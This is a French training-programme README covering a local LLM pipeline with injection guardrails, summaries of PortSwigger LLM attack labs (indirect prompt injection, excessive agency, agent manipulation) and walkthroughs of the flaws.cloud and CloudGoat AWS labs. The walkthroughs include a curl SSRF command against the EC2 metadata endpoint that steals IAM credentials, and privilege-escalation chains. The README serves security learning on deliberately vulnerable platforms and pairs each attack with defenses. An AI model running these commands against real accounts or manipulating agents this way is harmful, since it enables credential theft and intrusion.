# LLMSecOps — Programme 31 Semaines : LLMOps, Offensive LLM, Cloud AWS, Embarqué

**Ngagne Demba Dia**
Master Sécurité des Systèmes Embarqués · UCAD · Dakar
AngeVirusLab · Shadow Bytes Red Team · 2026

---

## 1. Introduction

Ce programme **LLMSecOps** de 31 semaines couvre le spectre complet de la sécurité des systèmes IA modernes : des fondations opérationnelles (LLMOps) jusqu'à l'exploitation offensive des infrastructures Cloud AWS et des systèmes embarqués NVIDIA.

L'architecture du programme suit une logique de progression défensive → offensive :

```text
Pilier 0 : LLMOps        → comprendre comment un LLM fonctionne en production
Pilier 1 : LLM Offensive → attaquer ce pipeline (PortSwigger LLM Labs)
Pilier 2 : Cloud AWS     → attaquer l'infrastructure qui héberge ces LLMs
Pilier 3 : Embarqué      → attaquer le matériel sur lequel tout repose
```

---

## 2. Pilier 0 — LLMOps Foundations (Semaines 1–8)

### 2.1 Objectif

Déployer, évaluer, sécuriser et monitorer un LLM de bout en bout en environnement local.
Tout tourne **100% open source, 0$ tooling** sur GPU local (NVIDIA RTX 3060 + CUDA 12.4 via WSL2).

### 2.2 Stack technique

| Couche | Outil | Rôle |
| --- | --- | --- |
| **LLM Runtime** | Ollama · LLaMA3.1:8b | Inférence locale sur GPU |
| **Orchestration** | LangChain | Chaînes RAG, agents, prompts |
| **Observabilité** | LangFuse 4.x | Traces, tokens, latence |
| **Vectorstore** | ChromaDB | Base vectorielle locale |
| **Embeddings** | paraphrase-multilingual-MiniLM-L12-v2 | Encodage sémantique FR/EN |
| **Évaluation** | RAGAS | Faithfulness, answer relevancy |
| **Monitoring** | Prometheus + Grafana | Métriques temps réel |
| **Guardrails** | InputRail + OutputRail (regex) | Sécurité anti-injection |

### 2.3 Architecture du pipeline final

```text
User Input
      │
      ▼ INPUT RAIL (OWASP LLM01 — Prompt Injection)
      │   injection / jailbreak / contenu dangereux → BLOCKED
      │
      ▼ RAG RETRIEVE — ChromaDB · k=4 · 3387 chunks · 13 PDFs sécurité
      │
      ▼ LLM GENERATE — LLaMA3.1:8b · temperature=0
      │
      ▼ OUTPUT RAIL (OWASP LLM02 — Insecure Output)
      │   commandes destructives / credentials / API keys → BLOCKED
      │
      ▼ LangFuse → Prometheus → Grafana
      │
      ▼ User Response + Sources documentaires
```

### 2.4 Résultats semaine par semaine

**Week 1-2 — Agent LLM local + LangFuse**
Agent ReAct avec 3 outils (calculatrice, web search, file reader). Tracing complet LangFuse v4.x.
Leçon clé : `langfuse.trace()` a disparu en v4 → utiliser `start_as_current_observation()` context manager.

**Week 3-4 — Prompt Tracker + A/B Testing**
Versioning de prompts, comparaison de versions, détection d'hallucination par ancrage dans le contexte.

**Week 5 — Guardrails (OWASP LLM01/02)**
InputRail bloque 8 catégories (injection, jailbreak, DAN, tag injection, malware, DDoS).
OutputRail filtre commandes destructives, SQL DROP, API keys, credentials.
Fix CAS 7 : pattern `écrire` (avec accent) ne matchait pas `Ecris-moi` → élargir avec `ecri[rst]`.

**Week 6 — RAG Pipeline**
Corpus : 13 PDFs sécurité (1360 pages) → 3387 chunks ChromaDB.
RAGAS : meilleur score sur CAN bus (faithfulness=1.0, relevancy=0.959), mauvais retrieval sur Hardware Trojan.

**Week 7 — Monitoring**
LangFuse → Prometheus Exporter → Grafana. 5 métriques : latence P95, tokens input/output, error rate, hallucination rate.
Fix tokens : en LangFuse v4.x les tokens sont dans les **observations**, pas les traces.

#### Week 8 — Final Project : Secure RAG Pipeline (8/8)

| Cas | Catégorie | Résultat |
| --- | --- | --- |
| 3 requêtes normales | NORMAL | ALLOWED — réponses avec sources |
| 3 injections | INJECTION | BLOCKED — zéro token consommé |
| 2 requêtes malveillantes | HARMFUL | BLOCKED — zéro token consommé |

Score : **8/8** · Latence P95 : 43 030 ms · Tokens moy. : 729/req

---

## 3. Pilier 1 — LLM Security Offensive (Semaines 9–14)

### 3.1 Objectif

Attaquer les systèmes LLM en production via les vecteurs identifiés dans le Pilier 0.
Labs réalisés sur **PortSwigger Web Security Academy** — section LLM Attacks.

### 3.2 Labs couverts

| Lab | Niveau | Vulnérabilité | Technique |
| --- | --- | --- | --- |
| Exploitation des API LLM avec autonomie excessive | APPRENTI | OWASP LLM08 — Excessive Agency | Manipulation d'un agent LLM pour exécuter des actions non autorisées via ses outils |
| Exploitation des vulnérabilités dans les API LLM | PRATICIEN | OS Command Injection via LLM | Injection de commandes OS à travers une API LLM sans sanitisation des sorties |
| Injection indirecte de prompt | PRATICIEN | Indirect Prompt Injection | Injection via contenu tiers (page web, document) lu par l'agent — contournement sans accès direct |
| Exploitation d'agents IA — actions destructives | APPRENTI | AI Agent Manipulation | Manipulation d'un agent IA pour déclencher des actions destructives (suppression de données) |

### 3.3 Axes couverts

- **Excessive Agency (LLM08)** : un LLM avec trop de permissions peut être manipulé pour dépasser son périmètre autorisé
- **OS Command Injection** : les sorties LLM non filtrées passées à un shell créent une surface d'injection classique
- **Indirect Prompt Injection** : le vecteur d'attaque n'est pas l'utilisateur mais le contenu externe lu par l'agent
- **AI Agent Manipulation** : un agent avec accès à des fonctions destructives peut être détourné

---

## 4. Pilier 2 — Cloud Offensif AWS (Semaines 15–22)

### 4.1 Objectif

Exploiter les mauvaises configurations AWS les plus répandues : S3 publics, credentials dans git, snapshots EC2 exposés, SSRF vers IMDS, escalade de privilèges IAM.

### 4.2 flaws.cloud — Niveaux 1 à 6

Plateforme d'entraînement AWS créée par Scott Piper (summitroute). 6 niveaux progressifs.

#### Level 1 — Bucket S3 public

```bash
aws s3 ls s3://flaws.cloud/ --no-sign-request
```

Accès sans credentials. Leçon : activer "Block Public Access" au niveau compte AWS.

#### Level 2 — ACL "authenticated users"

```bash
aws s3 ls s3://level2-....flaws.cloud --profile default
```

"Authenticated users" dans une ACL S3 = n'importe quel compte AWS dans le monde.

#### Level 3 — .git/ exposé dans S3

```bash
aws s3 sync s3://level3-....flaws.cloud/ ./level3
git show f52ec03  # credentials AWS supprimés mais récupérables
```

Leçon : supprimer un fichier d'un commit ne supprime pas son historique. Toujours révoquer.

#### Level 4 — EC2 snapshot public

```bash
aws ec2 describe-snapshots --owner-ids 975426262029 --region us-west-2
# Créer volume → monter → cat setupNginx.sh → password en clair
```

Les snapshots EC2 contiennent une copie exacte du disque — configs, scripts, historique bash.

#### Level 5 — SSRF via proxy nginx → IMDS

```bash
curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws
# → credentials temporaires du rôle flaws
aws s3 ls s3://level6-....flaws.cloud/ --profile flaws5
# → PRE ddcc78ff/  ← répertoire caché
```

Un proxy HTTP sans restriction d'IP interne = SSRF vers le metadata service EC2.

#### Level 6 — SecurityAudit + API Gateway + Lambda

```bash
aws lambda list-functions --region us-west-2 --profile level6
aws lambda get-policy --function-name Level6 --region us-west-2 --profile level6
# → API Gateway s33ppypa75 / Prod / GET /level6
curl https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6
# → "Go to http://theend-....flaws.cloud/d730aa2b/"
```

La policy SecurityAudit donne une visibilité large — combinée à list_apigateways, permet d'invoquer une Lambda publique.

### 4.3 CloudGoat — IAM Privilege Escalation by Attachment

**Scénario :** user `kerrigan` avec permissions EC2 limitées → admin via rôle EC2.

```text
kerrigan → ListRoles + ListInstanceProfiles
         → RemoveRoleFromInstanceProfile (meek → retiré)
         → AddRoleToInstanceProfile (mighty → attaché)
         → RunInstances + CreateKeyPair
         → SSH → curl 169.254.169.254 → credentials mighty (admin)
```

**Permission clé exploitée :** `iam:PassRole` + `iam:AddRoleToInstanceProfile` + `ec2:RunInstances`

**Impact :** credentials temporaires STS du rôle admin → accès complet au compte AWS.

**Défense :** restreindre `iam:PassRole` à des rôles spécifiques, jamais `Resource: *`. Forcer IMDSv2.

### 4.4 CloudGoat — Cloud Breach S3

**Scénario :** EC2 publique avec proxy HTTP vulnérable → données bancaires.

```text
EC2 publique → SSRF Host header → 169.254.169.254
             → rôle cg-banking-WAF-Role
             → credentials STS temporaires
             → aws s3 ls → cg-cardholder-data-bucket
             → cardholder_data_primary.csv (SSN, PII)
             → cardholders_corporate.csv (SSN + passwords en clair)
             → upload poc.txt → écriture confirmée
```

**Vecteur :** le serveur proxifie les requêtes HTTP selon le header `Host` — aucune restriction sur 169.254.169.254.

**Impact :** lecture + écriture sur bucket bancaire — violation PCI-DSS / RGPD.

**Défense :** forcer IMDSv2, bloquer 169.254.0.0/16 au niveau proxy/WAF, principe du moindre privilège sur les rôles EC2.

---

## 5. Pilier 3 — Embarqué NVIDIA (Semaines 23–31)

> À venir — Sécurité des systèmes embarqués NVIDIA : firmware, side-channel attacks, Jetson platform security.

---

## 6. Key Learnings transversaux

### LLMOps → Offensive

- Comprendre le pipeline LLM en détail permet d'identifier ses angles morts (RAG Poisoning, guardrails contournables)
- Les regex sont fragiles : reformulation, encodage, unicode contournent les InputRails

### LLM Offensive → Cloud

- Les LLMs en production tournent sur des EC2 avec des rôles IAM — une SSRF dans le pipeline = credentials AWS volés
- Excessive Agency : un agent avec accès S3/IAM peut exfiltrer des données sensibles si manipulé

### Cloud AWS — Patterns récurrents

- **SSRF → IMDS** : toute application qui fait des requêtes HTTP sans filtrer 169.254.169.254 expose les credentials EC2
- **Principe du moindre privilège** : `S3FullAccess` sur un rôle WAF est une configuration défaillante
- **Snapshots et historique** : les sauvegardes (EC2 snapshots, git history) contiennent souvent des secrets supprimés mais récupérables
- **IMDSv2** : la mitigation la plus efficace contre les SSRF vers le metadata service

---

## 7. Hardware

```text
CPU : AMD Ryzen 7 5800H @ 3.2 GHz
RAM : 40 GB DDR4
GPU : NVIDIA GeForce RTX 3060 Laptop (6 GB VRAM) — CUDA 12.4
OS  : WSL2 Ubuntu sur Windows 11 Pro
```

---

Ngagne Demba Dia · Master Sécurité des Systèmes Embarqués · UCAD · Dakar, 2026
